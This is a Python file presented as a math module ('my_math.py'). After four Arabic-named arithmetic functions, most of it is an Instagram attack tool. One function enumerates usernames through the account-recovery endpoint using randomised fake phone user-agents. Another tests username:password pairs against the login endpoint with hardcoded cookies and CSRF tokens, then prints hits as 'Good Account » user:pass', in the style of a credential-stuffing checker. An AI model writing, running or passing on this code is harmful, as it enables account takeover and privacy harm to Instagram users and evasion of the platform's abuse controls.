# my_math.py
import requests
import random

# العمليات الحسابية
def زائد(a, b):
    return a + b

def ناقص(a, b):
    return a - b

def قسمه(a, b):
    if b == 0:
        return "خطأ: لا يمكن القسمة على صفر"
    return a / b

def ضرب(a, b):
    return a * b

# Instagram account

def user_instagram(user):
    headers={'User-Agent': f'Mozilla/5.0 (Linux; Android {random.choice(["9", "10", "11", "12", "13", "14"])}; {random.choice(["SM-G973F", "SM-G991B", "SM-G998B", "SM-A525F", "SM-A715F", "SM-A105F","Redmi Note 8 Pro", "Redmi Note 9S", "Redmi Note 10", "Redmi Note 11 Pro", "Redmi K40", "Mi 9T","Pixel 2", "Pixel 3", "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Pixel 8","OnePlus 7T", "OnePlus 8 Pro", "OnePlus 9", "OnePlus Nord 2", "OnePlus 10T","Vivo V23", "Vivo X60", "Vivo Y20", "Vivo Y51", "Vivo X80","Huawei P30", "Huawei P40 Pro", "Huawei Mate 30", "Huawei Nova 7", "Huawei Y9 Prime","Realme 5 Pro", "Realme 6", "Realme 7", "Realme GT Neo 2", "Realme X7","Oppo F11 Pro", "Oppo A9 2020", "Oppo Reno 4", "Oppo Reno 6 Pro", "Oppo Find X3 Pro"])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice([f"132.0.{random.randint(4000, 7000)}.{random.randint(100, 300)}"])} Mobile Safari/537.36','x-ig-app-id': "1217981644879628",'x-requested-with': "AHMED",'x-instagram-ajax': "1020156280",'x-csrftoken': "messing",'origin': "https://www.instagram.com",'referer': "https://www.instagram.com/accounts/login/",'accept-language': "en-US"}
    response = requests.post(
        "https://www.instagram.com/api/v1/web/accounts/account_recovery_ajax/",
        data={'query': user},
        headers=headers
    ).json()

    if response.get('status') == 'ok':
        return f"Bad {user}"
    elif response.get('status') == 'fail':
        return f"Good {user}"
    else:
        return f"Error {user}"

def instagram_account(username, password):
    headers = {'accept': '*/*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded', 'cookie': 'mid=X_m5HAAEAAGsvSjAO2PKY1ERwxwz; csrftoken=H4HMZcIZRvlzRQcVCewR7kFEcFrOM0pu;', 'origin': 'https://www.instagram.com', 'referer': 'https://www.instagram.com/', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36', 'x-csrftoken': 'H4HMZcIZRvlzRQcVCewR7kFEcFrOM0pu', 'x-ig-app-id': '1217981644879628', 'x-ig-www-claim': '0', 'x-instagram-ajax': '180c154d218a', 'x-requested-with': 'XMLHttpRequest'}


    data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}"
    }

    rr = requests.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers).json()

    if rr.get("lock") == False:
        return f'Secure » {username}:{password}'
    elif rr.get("authenticated") == True:
        return f'Good Account » {username}:{password}'
    else:
        return f'Bad » {username}:{password}'